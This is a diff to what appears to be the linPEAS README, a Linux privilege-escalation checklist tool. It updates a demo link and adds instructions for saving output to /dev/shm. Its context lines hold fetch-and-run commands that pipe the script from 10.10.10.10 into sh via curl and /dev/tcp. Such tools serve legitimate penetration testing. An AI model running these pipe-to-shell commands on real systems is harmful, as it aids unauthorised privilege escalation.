@@ -6,7 +6,7 @@
 
 Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**.
 
-[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/279208)
+[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)
 
 
 ## Quick Start
@@ -23,6 +23,12 @@ curl 10.10.10.10/linpeas.sh | sh
 #Without curl
 nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/10.10.10.10/80 | sh
+```
+
+```bash
+#Output to file
+linpeas -a > /dev/shm/linpeas.txt
+less -r /dev/shm/linpeas.txt #Read with colors
 ```
 
 **Use the parameter `-a` to execute all these checks.**
